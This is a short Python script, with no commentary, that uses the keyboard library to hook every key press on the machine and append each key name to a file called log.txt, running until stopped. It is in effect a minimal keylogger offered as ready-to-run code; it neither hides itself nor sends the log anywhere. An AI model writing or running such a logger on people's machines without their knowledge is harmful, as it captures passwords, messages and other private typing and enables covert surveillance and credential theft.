import keyboard

def on_key_press(event):
    key = event.name
    with open("log.txt", "a") as file:
        file.write(key + "\n")

keyboard.on_press(on_key_press)
keyboard.wait()